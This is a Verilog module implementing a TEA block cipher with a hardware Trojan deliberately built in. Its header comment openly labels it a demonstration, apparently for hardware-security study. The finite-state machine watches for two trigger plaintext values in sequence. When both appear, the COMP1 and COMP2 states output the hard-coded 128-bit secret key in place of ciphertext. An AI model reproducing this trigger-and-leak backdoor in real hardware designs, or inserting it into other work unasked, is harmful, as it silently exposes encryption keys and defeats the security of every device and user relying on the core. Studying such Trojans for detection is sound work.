// TEA encryption with hardware Trojan
// Simplified implementation to clearly demonstrate the Trojan functionality.

`timescale 1ns/1ps

module tea (
    input  wire         clk,
    input  wire         rst,        // synchronous reset, active high
    input  wire         start,      // pulse to start next block
    input  wire [63:0]  plaintext,
    output reg  [63:0]  ciphertext,
    output reg          done
);

    // ------------------------------------------------------------------------
    // Parameters
    // ------------------------------------------------------------------------
    localparam [127:0] SECRET_KEY = 128'hA56B_ABCD_0000_FFFF_1234_5678_9ABC_DEF0;
    localparam [31:0]  DELTA      = 32'h9E37_79B9;
    localparam integer ROUNDS     = 32;
    localparam [63:0]  TRIG1      = 64'h0123_4567_89AB_CDEF;
    localparam [63:0]  TRIG2      = 64'hFEDC_BA98_7654_3210;

    // ------------------------------------------------------------------------
    // FSM state encoding
    // ------------------------------------------------------------------------
    localparam IDLE       = 3'd0;
    localparam CHECK1     = 3'd1;
    localparam RUN        = 3'd2;
    localparam FINISH     = 3'd3;
    localparam COMP1      = 3'd4;
    localparam COMP2      = 3'd5;

    // ------------------------------------------------------------------------
    // Registers
    // ------------------------------------------------------------------------
    reg [2:0]   state, next_state;
    reg [31:0]  v0, v1, sum;
    reg [5:0]   round_cnt;

    // Next-state / datapath signals
    reg [2:0]   state_next;
    reg [31:0]  v0_next, v1_next, sum_next;
    reg [5:0]   round_cnt_next;
    reg [63:0]  ciphertext_next;
    reg         done_next;

    // ------------------------------------------------------------------------
    // Sequential update (clocked)
    // ------------------------------------------------------------------------
    always @(posedge clk) begin
        if (rst) begin
            state       <= IDLE;
            v0          <= 32'd0;
            v1          <= 32'd0;
            sum         <= 32'd0;
            round_cnt   <= 6'd0;
            ciphertext  <= 64'd0;
            done        <= 1'b0;
        end else begin
            state       <= next_state;
            v0          <= v0_next;
            v1          <= v1_next;
            sum         <= sum_next;
            round_cnt   <= round_cnt_next;
            ciphertext  <= ciphertext_next;
            done        <= done_next;
        end
    end

    // ------------------------------------------------------------------------
    // Combinational next-state & output logic
    // ------------------------------------------------------------------------
    always @* begin
        // default: hold current values
        next_state       = state;
        v0_next          = v0;
        v1_next          = v1;
        sum_next         = sum;
        round_cnt_next   = round_cnt;
        ciphertext_next  = ciphertext;
        done_next        = 1'b0;

        case (state)
            // IDLE: detect first trigger or start encryption
            IDLE: begin
                if (start) begin
                        // initialize TEA
                    v0_next        = plaintext[63:32];
                    v1_next        = plaintext[31: 0];
                    sum_next       = 32'd0;
                    round_cnt_next = 6'd0;
                    if (plaintext == TRIG1) begin
                        next_state = CHECK1;
                    end else begin
                        next_state = RUN;
                    end
                end
                else begin
                    next_state = IDLE;
                end
            end

            // CHECK1: saw first trigger, now check for second
            CHECK1: begin
                if (plaintext == TRIG2) begin
                    next_state = COMP1;
                end else begin
                    sum_next         = sum + DELTA;
                    v0_next          = v0 + (
                        ((v1 << 4) + SECRET_KEY[127:96]) ^
                        (v1 + sum)                     ^
                        ((v1 >> 5) + SECRET_KEY[ 95:64])
                    );
                    v1_next          = v1 + (
                        ((v0 << 4) + SECRET_KEY[ 63:32]) ^
                        (v0 + sum)                     ^
                        ((v0 >> 5) + SECRET_KEY[ 31: 0])
                    );
                    round_cnt_next   = round_cnt + 1;
                    if (round_cnt == ROUNDS-1) begin
                        next_state   = FINISH;
                    end else begin
                        next_state   = RUN;
                    end
                end
            end

            // RUN: perform one round of TEA per cycle
            RUN: begin
                sum_next         = sum + DELTA;
                v0_next          = v0 + (
                    ((v1 << 4) + SECRET_KEY[127:96]) ^
                    (v1 + sum)                     ^
                    ((v1 >> 5) + SECRET_KEY[ 95:64])
                );
                v1_next          = v1 + (
                    ((v0 << 4) + SECRET_KEY[ 63:32]) ^
                    (v0 + sum)                     ^
                    ((v0 >> 5) + SECRET_KEY[ 31: 0])
                );
                round_cnt_next   = round_cnt + 1;
                if (round_cnt == ROUNDS-1) begin
                    next_state   = FINISH;
                end else begin
                    next_state   = RUN;
                end
            end

            // FINISH: output ciphertext, then go IDLE
            FINISH: begin
                ciphertext_next = {v0, v1};
                done_next       = 1'b1;
                next_state      = IDLE;
            end

            // COMP1: Trojan active, leak MSW of key
            COMP1: begin
                ciphertext_next = SECRET_KEY[127:64];
                done_next       = 1'b1;
                next_state      = COMP2;
            end

            // COMP2: Trojan active, leak LSW then return to IDLE
            COMP2: begin
                ciphertext_next = SECRET_KEY[63:0];
                done_next       = 1'b1;
                next_state      = IDLE;
            end

            default: next_state = IDLE;
        endcase
    end

endmodule
